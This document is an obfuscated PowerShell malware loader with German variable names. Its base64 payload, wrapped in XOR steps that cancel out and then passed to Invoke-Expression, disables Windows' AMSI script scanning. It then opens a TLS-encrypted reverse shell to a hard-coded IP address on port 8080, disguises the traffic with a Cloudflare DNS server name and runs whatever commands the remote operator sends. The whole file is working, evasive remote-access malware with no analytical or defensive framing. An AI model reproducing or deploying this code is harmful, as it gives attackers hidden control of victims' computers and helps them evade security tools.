function R1 { param($rnd) if($null -ne $rnd){ return $rnd.Next(1,101) } else { return (Get-Random -Minimum 1 -Maximum 101) } }
function R2 { param([byte[]]$x,[byte[]]$y) $z = New-Object byte[] $x.Length; for($i=0;$i -lt $x.Length;$i++){ $z[$i] = $x[$i] -bxor $y[$i % $y.Length] } ; return $z }

# 
$zutat = "JGFzMHNqODBadURIY24wc002ZWtzPSRudWxsOyRCQTlMNV9HVT0iU3lzdGVtLiQoKCdNw6EnKyduw6InKydnw6gnKydtw6onKydudCcpLk5PUk1hbGl6RShbY0hhUl0oW0J5VEVdMHg0NikrW2NIQXJdKFtieXRFXTB4NmYpK1tDaGFSXShbQllURV0weDcyKStbQ2hhUl0oW2J5dGVdMHg2ZCkrW2NIYVJdKDIrNjYpKSAtcmVwbGFjZSBbQ2hhcl0oNjIrMzApK1tDSGFSXSgxMTIqNjIvNjIpK1tjSEFSXSgxMjMpK1tDaGFSXSgzOSszOCkrW0NoYVJdKFtieXRlXTB4NmUpK1tjSGFSXShbYnl0RV0weDdkKSkuJCgoJ8OEw7t0w7VtJysnw6N0w67Ds24nKS5Ob1JNQUxJekUoW0NIYVJdKDcwKStbQ2hBUl0oMTExKzIwLTIwKStbY0hBUl0oW0JZVGVdMHg3MikrW0NIQXJdKFtiWXRFXTB4NmQpK1tDSEFSXSg2OCkpIC1yZXBsYWNlIFtDaEFSXSg5Mio1NC81NCkrW0NIYXJdKFtCWXRFXTB4NzApK1tjaEFyXShbYnl0ZV0weDdiKStbQ0hBUl0oNTIrMjUpK1tjaGFyXSgxMTApK1tjaEFSXShbYllURV0weDdkKSkuJCgoJ8OEbXPDrsObdCcrJ8OsbHMnKS5uT3JNQUxJWkUoW0NIYXJdKDcwKjY0LzY0KStbQ0hBUl0oW0JZVGVdMHg2ZikrW0NIYVJdKFtCWXRlXTB4NzIpK1tjaEFyXShbQllUZV0weDZkKStbQ0hhUl0oW2JZdGVdMHg0NCkpIC1yZXBsYWNlIFtjSEFSXShbYnl0ZV0weDVjKStbY0hhcl0oMzUrNzcpK1tDSGFyXSg3Mis1MSkrW0NoYXJdKFtiWVRlXTB4NGQpK1tjaEFSXSg0MSs2OSkrW0NIQXJdKFtiWXRlXTB4N2QpKSI7JGJwdmhqZ3R5Zm1xd2c9IitbQ0hhcl0oW0JZVEVdMHg3MSkrW0NIYVJdKDYrMTAxKStbY0hBcl0oNzkrMjApK1tDaEFyXSgzKzExOCkrW0NoYXJdKDk4KzcxLTcxKStbQ0hhUl0oW0J5dGVdMHg3MikrW0NoQVJdKFtieXRFXTB4N2EpK1tjaGFSXSgxMDIrMjYtMjYpK1tDSGFyXShbQllUZV0weDY2KStbY2hhcl0oW2JZVEVdMHg3MikiO1tUaHJlYWRpbmcuVGhyZWFkXTo6U2xlZXAoMTY0Myk7W1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjooIiQoKCdXcsOsdMOqJysnw4xudDMyJykuTk9STWFMSVplKFtjaGFSXShbQll0ZV0weDQ2KStbQ2hhcl0oW2JZVGVdMHg2ZikrW0NIQVJdKFtieVRFXTB4NzIpK1tjaGFSXShbYnl0RV0weDZkKStbQ0hBcl0oW0J5VEVdMHg0NCkpIC1yZXBsYWNlIFtjaEFSXSg5MikrW0NIQVJdKFtCWVRlXTB4NzApK1tDSEFyXShbYnl0ZV0weDdiKStbY0hBcl0oNzcpK1tjaEFyXShbYllUZV0weDZlKStbQ2hhcl0oMTI1KzUxLTUxKSkiKShbUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCRCQTlMNV9HVSkuR2V0RmllbGQoIiQoKCfDo21zw61DJysnw7RudMOqeCcrJ3QnKS5Ob3JtYUxpekUoW0NoYVJdKFtiWXRFXTB4NDYpK1tjSEFyXShbQll0ZV0weDZmKStbY2hBUl0oW2J5dGVdMHg3MikrW0NIQXJdKFtCeVRFXTB4NmQpK1tjSGFSXSg2OCo0Ni80NikpIC1yZXBsYWNlIFtDaEFyXSg5MikrW2NoYVJdKFtieXRFXTB4NzApK1tDaEFyXSgxMjMpK1tDSEFSXSg3NykrW0NIYXJdKFtiWVRFXTB4NmUpK1tDSEFyXShbQnl0ZV0weDdkKSkiLFtSZWZsZWN0aW9uLkJpbmRpbmdGbGFnc10iTm9uUHVibGljLFN0YXRpYyIpLkdldFZhbHVlKCRhczBzajgwWnVESGNuMHNNNmVrcyksMHgxYjVkNjY1ZCk7JHZuaT0iK1tDaGFyXShbQnl0ZV0weDcwKStbY2hhUl0oMTIwKjYwLzYwKStbY2hBUl0oW2JZdGVdMHg2ZSkrW2NIQVJdKFtiWXRFXTB4NjMpK1tDaGFyXSgxMTApK1tjaEFSXShbQllUZV0weDcyKStbQ2hBcl0oNisxMTIpK1tDaEFSXShbYnl0RV0weDY2KStbY0hhcl0oW2J5dGVdMHg2OSkrW2NIQXJdKDEwNis4My04MykrW2NoQVJdKDEwNioxNS8xNSkrW2NoYVJdKDEwMSsyMC0yMCkrW2NoYXJdKDEwOCo2Ny82NykrW0NoQXJdKDE4Kzk5KStbQ0hBUl0oMTE5KStbY2hhUl0oW0JZdEVdMHg3MCkrW0NoYXJdKFtCeXRlXTB4N2EpK1tDSGFyXSgxMTIqNDIvNDIpK1tjSEFSXShbYnl0ZV0weDc0KStbQ0hBUl0oW0J5VEVdMHg3MSkrW2NIQVJdKDExNSsxMDUtMTA1KStbQ0hhcl0oW0JZVEVdMHg3MikrW2NIYVJdKDExOCsxMy0xMykrW0NoQVJdKFtiWVRlXTB4NzMpK1tDaEFSXSgxMDkrOTYtOTYpK1tDaEFSXShbYll0ZV0weDc2KStbQ0hBcl0oMTA3KSI7W1RocmVhZGluZy5UaHJlYWRdOjpTbGVlcCg1MTkpDQpTdGFydC1TbGVlcCAtU2Vjb25kcyA2MA0KU3RhcnQtU2xlZXAgLVNlY29uZHMgNjAgICN5dXVodHlwZXNoaXQNCmZ1bmN0aW9uIERlY29kZS1CYXNlNjRTdHJpbmcoJFdpY2hzKXtbVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkV2ljaHMpKX0NCiRGaWNrdEV1cmVNdXR0ZXI9RGVjb2RlLUJhc2U2NFN0cmluZyAiT0RrdU1USXVNVEF5TGpFeU5BPT0iDQpTdGFydC1TbGVlcCAtU2Vjb25kcyAyDQokV3Vyc3RTYW5kd2ljaDQyMD1baW50XShEZWNvZGUtQmFzZTY0U3RyaW5nICJPREE0TUE9PSIpDQpTdGFydC1TbGVlcCAtU2Vjb25kcyAyDQokRXNFc0VMPVtTeXN0ZW0uU2VjdXJpdHkuQXV0aGVudGljYXRpb24uU3NsUHJvdG9jb2xzXTo6VGxzMTINCg0KZnVuY3Rpb24gV3JpdGUtU3RyZWFtKCRzdywkdHh0KXskc3cuV3JpdGUoJHR4dCArICdIdWxzZT4gJyk7JHN3LkZsdXNoKCl9DQoNCndoaWxlKCR0cnVlKXsNCiAgICB0cnl7DQogICAgICAgICRjbGk9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQNCiAgICAgICAgJGNsaS5Db25uZWN0KCRGaWNrdEV1cmVNdXR0ZXIsJFd1cnN0U2FuZHdpY2g0MjApDQogICAgICAgICRuZXRTdHJlYW09JGNsaS5HZXRTdHJlYW0oKQ0KICAgICAgICAkc3NsPU5ldy1PYmplY3QgTmV0LlNlY3VyaXR5LlNzbFN0cmVhbSgkbmV0U3RyZWFtLCRmYWxzZSwoeyR0cnVlfSAtYXMgW05ldC5TZWN1cml0eS5SZW1vdGVDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFja10pKQ0KICAgICAgICAkc3NsLkF1dGhlbnRpY2F0ZUFzQ2xpZW50KCdjbG91ZGZsYXJlLWRucy5jb20nLCRudWxsLCRFc0VzRUwsJGZhbHNlKQ0KICAgICAgICBpZigtbm90ICgkc3NsLklzRW5jcnlwdGVkIC1hbmQgJHNzbC5Jc1NpZ25lZCkpeyAkc3NsLkNsb3NlKCk7JGNsaS5DbG9zZSgpO1N0YXJ0LVNsZWVwIDU7Y29udGludWUgfQ0KDQogICAgICAgICRzdz1OZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkc3NsKQ0KICAgICAgICAkc3cuQXV0b0ZsdXNoPSR0cnVlDQogICAgICAgIFdyaXRlLVN0cmVhbSAkc3cgJycNCg0KICAgICAgICAkYnVmPU5ldy1PYmplY3QgQnl0ZVtdIDQwOTYNCiAgICAgICAgd2hpbGUoJHRydWUpew0KICAgICAgICAgICAgdHJ5ew0KICAgICAgICAgICAgICAgICRyPSRzc2wuUmVhZCgkYnVmLDAsJGJ1Zi5MZW5ndGgpDQogICAgICAgICAgICAgICAgaWYoJHIgLWxlIDApe3Rocm93ICJ4In0NCiAgICAgICAgICAgICAgICAkY21kPShbVGV4dC5FbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkYnVmLDAsJHIpLlRyaW0oKQ0KICAgICAgICAgICAgICAgIGlmKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRjbWQpKXtXcml0ZS1TdHJlYW0gJHN3ICcnO2NvbnRpbnVlfQ0KDQogICAgICAgICAgICAgICAgIw0KICAgICAgICAgICAgICAgIGlmKCRjbWQgLW1hdGNoICdeXHMqaWV4XHMrJyl7DQogICAgICAgICAgICAgICAgICAgICRvdXQ9Ii4iDQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgdHJ5eyRvdXQ9SW52b2tlLUV4cHJlc3Npb24gJGNtZCAyPiYxIHwgT3V0LVN0cmluZ31jYXRjaHskb3V0PSRfLkV4Y2VwdGlvbi5NZXNzYWdlfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBXcml0ZS1TdHJlYW0gJHN3ICRvdXQNCiAgICAgICAgICAgIH1jYXRjaHticmVha30NCiAgICAgICAgfQ0KDQogICAgICAgICRzdy5DbG9zZSgpDQogICAgICAgICRzc2wuQ2xvc2UoKQ0KICAgICAgICAkbmV0U3RyZWFtLkNsb3NlKCkNCiAgICAgICAgJGNsaS5DbG9zZSgpDQogICAgfWNhdGNoe30NCiAgICBTdGFydC1TbGVlcCA1DQp9DQo="                 # 
$seed  = $null              # 

try{
    if([string]::IsNullOrEmpty($zutat)){ throw "." }
    if($zutat.Length -lt 27){ throw "Z" }

    $s1 = $zutat.Substring(0,4)
    $s2 = $zutat.Substring(4,5)
    $s3 = $zutat.Substring(9,4)
    $s4 = $zutat.Substring(13,6)
    $s5 = $zutat.Substring(19,3)
    $s6 = $zutat.Substring(22,5)
    $s7 = $zutat.Substring(27)
    $gekocht = $s1+$s2+$s3+$s4+$s5+$s6+$s7

    $b = [Text.Encoding]::UTF8.GetBytes($gekocht)

    if($null -ne $seed){ $rand = New-Object System.Random($seed); $r = R1 $rand } else { $r = R1 $null }

    $c = [string][math]::Round([math]::Pow($r,10))
    $d = [Text.Encoding]::UTF8.GetBytes($c)
    if($d.Length -eq 0){ throw "Key-Bytes leer." }
    $e = $d[($d.Length-1)..0]

    $f1 = R2 -x $b -y $d
    $f2 = R2 -x $f1 -y $e
    $g = [Text.Encoding]::UTF8.GetString($f2)

    $h = R2 -x ([Text.Encoding]::UTF8.GetBytes($g)) -y $e
    $i = R2 -x $h -y $d
    $j = [Text.Encoding]::UTF8.GetString($i)

    try{ $k = [Convert]::FromBase64String($j) } catch { throw "Base64-Decode fehlgeschlagen: $($_.Exception.Message)" }
    $l = [Text.Encoding]::UTF8.GetString($k)

    #
    Invoke-Expression $l

} catch {
    Write-Error "Fehler: $($_.Exception.Message)"
}

